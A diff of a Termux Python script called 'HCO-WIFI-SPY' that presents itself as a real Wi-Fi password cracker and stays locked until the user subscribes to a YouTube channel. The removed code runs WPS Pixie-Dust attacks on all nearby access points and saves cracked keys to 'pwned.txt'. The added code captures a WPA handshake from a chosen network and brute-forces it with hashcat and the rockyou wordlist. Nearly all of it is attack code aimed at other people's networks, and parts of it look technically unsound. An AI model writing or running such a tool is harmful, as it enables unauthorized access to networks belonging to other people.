@@ -1,123 +1,91 @@
 #!/data/data/com.termux/files/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# HCO-Wifi-Spy.py – real WiFi cracker, subscriber-locked, Termux, no root
-import os,sys,time,subprocess,threading,requests,re
+# HCO-WIFI-SPY.py – REAL Wi-Fi cracker, Termux, no root, subscriber-locked
+import os,sys,time,subprocess,requests,re
 RED   =lambda x:f"\033[91m{x}\033[0m"
 GREEN =lambda x:f"\033[92m{x}\033[0m"
+YELLOW=lambda x:f"\033[93m{x}\033[0m"
+CYAN  =lambda x:f"\033[96m{x}\033[0m"
 SDCARD="/sdcard"
-LOCK_FILE=f"{SDCARD}/.hco_unlocked"
-def shell(cmd):
-    return subprocess.run(cmd,shell=True,capture_output=True,text=True).stdout.strip()
+LOCK_FILE=f"{SDCARD}/.hco_unlocked3"
+DEF_WORDLIST=f"{SDCARD}/HCO/rockyou.txt"
+def shell(cmd):return subprocess.run(cmd,shell=True,capture_output=True,text=True).stdout.strip()
 def dl(url,path):
     with requests.get(url,stream=True)as r:
         with open(path,"wb")as f:
             for chunk in r.iter_content(8192):f.write(chunk)
 def banner():
-    print(GREEN("┌"+"─"*61+"┐"))
+    print(CYAN("┌"+"─"*65+"┐"))
     for l in ["██╗  ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗",
               "██║  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║",
               "███████║█████╗  ██║   ██║██████╔╝██╔████╔██║",
               "██╔══██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║",
               "██║  ██║███████╗╚██████╔╝██║  ██║██║ ╚═╝ ██║",
               "╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝"]:
-        print(RED(f"│{l.center(61)}│").replace("│",GREEN("│")))
-    print(RED("│{:^61}│".format("Wifi Spy  –  by @hackers_colony_tech")).replace("│",GREEN("│")))
-    print(GREEN("└"+"─"*61+"┘"))
+        print(RED(f"│{l.center(65)}│").replace("│",CYAN("│")))
+    print(RED("│{:^65}│".format("WIFI  SPY  –  by @hackers_colony_tech")).replace("│",CYAN("│")))
+    print(CYAN("└"+"─"*65+"┘"))
 def countdown():
     for i in range(98,0,-1):
-        print(f"\r{i} ",end="",flush=True)
+        print(f"\r{RED(i)} ",end="",flush=True)
         time.sleep(0.08)
     print("\n")
 def unlock():
     if os.path.exists(LOCK_FILE):return
-    print(RED("🔒 Tool is LOCKED!"))
-    print("Subscribe to our YouTube channel & whack the bell icon.")
-    input("Press ENTER only AFTER you sub + bell … ")
+    print(RED("🔒 TOOL IS LOCKED!"))
+    print(YELLOW("Subscribe to our YouTube channel & smash the bell icon."))
+    input("Press ENTER only after you sub + bell … ")
     countdown()
-    shell("am start -a android.intent.action.VIEW -d https://youtube.com/@hackers_colony_tech?si=kbf-Oi09GQVF0jW_")
+    os.system("am start -a android.intent.action.VIEW -d https://youtube.com/@hackers_colony_tech?si=kbf-Oi09GQVF0jW_")
     input("Come back & press ENTER to unlock … ")
     with open(LOCK_FILE,"w")as f:f.write("unlocked")
-    print(GREEN("✅ Unlocked! Launch again to hack.\n"))
+    print(GREEN("✅ Unlocked! Restart tool to use."))
     sys.exit()
-# ---------- REAL WIFI SECTION ----------
-def install_tools():
+def install_deps():
     os.makedirs(f"{SDCARD}/HCO",exist_ok=True)
+    shell("pkg update && pkg upgrade -y")
     shell("pkg install -y python git curl wget openssl-tool clang nano")
-    if not shell("which oneShot"):
-        dl("https://raw.githubusercontent.com/xdavidtv/OneShot/master/oneshot.py","/data/data/com.termux/files/usr/bin/oneshot")
-        shell("chmod +x /data/data/com.termux/files/usr/bin/oneshot")
-    if not shell("which pixiewps"):
-        dl("https://raw.githubusercontent.com/wiire/pixiewps/master/src/pixiewps.c",f"{SDCARD}/pixiewps.c")
-        shell(f"gcc -o /data/data/com.termux/files/usr/bin/pixiewps {SDCARD}/pixiewps.c -O2")
-    if not os.path.exists("/data/data/com.termux/files/usr/bin/hashcat"):
+    if not shell("which hashcat"):
         dl("https://github.com/hashcat/hashcat/releases/download/v6.2.6/hashcat-6.2.6.7z",f"{SDCARD}/hc.7z")
         shell("pkg install -y p7zip; cd /sdcard; 7z x hc.7z; mv hashcat-6.2.6/hashcat.bin /data/data/com.termux/files/usr/bin/hashcat; chmod +x /data/data/com.termux/files/usr/bin/hashcat")
-    rock=f"{SDCARD}/HCO/rockyou.txt"
-    if not os.path.exists(rock):
-        dl("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou-75.txt",rock)
-def wps_scan(iface):
-    out=shell(f"oneShot -i {iface} -K")
-    return re.findall(r'BSSID:\s*([0-9a-f:]{17}).*?ESSID:\s*"([^"]+)"',out,re.S)
-def wps_crack(bssid,iface):
-    out=shell(f"oneShot -i {iface} -b {bssid} -F -p")
-    key=re.search("WPA.*Key.*?:\s*(\S+)",out)
-    return key.group(1)if key else None
-def cap_handshake(iface,ssid,bssid):
+    if not os.path.exists(DEF_WORDLIST):
+        dl("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou-75.txt",DEF_WORDLIST)
+def scan_wifi():
+    print(CYAN("[*] Scanning nearby Wi-Fi networks …"))
+    shell("iw dev wlan0 scan > /sdcard/scan.txt")
+    nets=re.findall(r'BSS ([0-9a-f:]{17}).*?SSID: (.*?)\n.*?WPA',open("/sdcard/scan.txt").read(),re.S)
+    return nets
+def select_wifi(nets):
+    print(YELLOW("\nAvailable networks:"))
+    for idx,(bssid,ssid)in enumerate(nets,1):
+        print(f"{idx}) {ssid}")
+    choice=int(input("Select network number: "))-1
+    return nets[choice]
+def capture_handshake(iface,ssid,bssid):
     cap=f"{SDCARD}/HCO/{ssid}.cap"
     shell(f"timeout 30 tcpdump -i {iface} -w {cap} ether host {bssid} &")
     time.sleep(2)
     shell(f"iw dev {iface} station del {bssid}")
     time.sleep(30)
     return cap if os.path.exists(cap)else None
-def crack_handshake(cap,ssid):
-    rock=f"{SDCARD}/HCO/rockyou.txt"
-    res=shell(f"hashcat -m 22000 {cap} {rock} --show")
+def bruteforce(cap,ssid):
+    wordlist=input(f"Path to wordlist (leave empty for default): ").strip() or DEF_WORDLIST
+    print(CYAN(f"[*] Bruteforcing {ssid} with {wordlist} …"))
+    res=shell(f"hashcat -m 22000 {cap} {wordlist} --show")
     if res:return res.split(":")[-1]
     return None
-def menu():
-    banner()
-    print(RED("""
-1) Scan & Crack WPS (Pixie-Dust | Null-PIN)
-2) Capture & Crack WPA handshake (rockyou)
-3) Show saved passwords
-4) Exit
-"""))
 def main():
     unlock()
-    install_tools()
+    install_deps()
     iface="wlan0"
-    while 1:
-        menu()
-        ch=input("Select: ").strip()
-        if ch=="1":
-            print("[*] Scanning WPS-enabled APs …")
-            aps=wps_scan(iface)
-            for mac,ssid in aps:
-                print(f"[+] Attacking {ssid}")
-                key=wps_crack(mac,iface)
-                if key:
-                    print(GREEN(f"[+] CRACKED {ssid}  Key: {key}"))
-                    with open(f"{SDCARD}/HCO/pwned.txt","a")as f:f.write(f"{ssid}:{key}\n")
-                else:print(RED(f"[-] Failed on {ssid}"))
-        elif ch=="2":
-            print("[*] Scanning nearby networks …")
-            shell(f"iw dev {iface} scan > {SDCARD}/scan.txt")
-            nets=re.findall(r'BSS ([0-9a-f:]{17}).*?SSID: (.*?)\n.*?WPA',open(f"{SDCARD}/scan.txt").read(),re.S)
-            for bssid,ssid in nets:
-                print(f"[+] Capturing handshake for {ssid}")
-                cap=cap_handshake(iface,ssid,bssid)
-                if cap:
-                    key=crack_handshake(cap,ssid)
-                    if key:
-                        print(GREEN(f"[+] HANDSHAKE CRACKED {ssid}  Key: {key}"))
-                        with open(f"{SDCARD}/HCO/pwned.txt","a")as f:f.write(f"{ssid}:{key}\n")
-                    else:print(RED(f"[-] Handshake not cracked for {ssid}"))
-                else:print(RED(f"[-] No handshake captured for {ssid}"))
-        elif ch=="3":
-            print(GREEN("Saved passwords:"))
-            print(shell(f"cat {SDCARD}/HCO/pwned.txt"))
-        elif ch=="4":
-            break
-        else:print(RED("Invalid choice"))
+    nets=scan_wifi()
+    if not nets:print(RED("[-] No networks found"));return
+    bssid,ssid=select_wifi(nets)
+    print(CYAN(f"[*] Capturing handshake for {ssid} …"))
+    cap=capture_handshake(iface,ssid,bssid)
+    if not cap:print(RED("[-] Handshake capture failed"));return
+    key=bruteforce(cap,ssid)
+    if key:print(GREEN(f"[+] PASSWORD CRACKED: {key}"))
+    else:print(RED("[-] No password matched"))
 if __name__=="__main__":
     main()
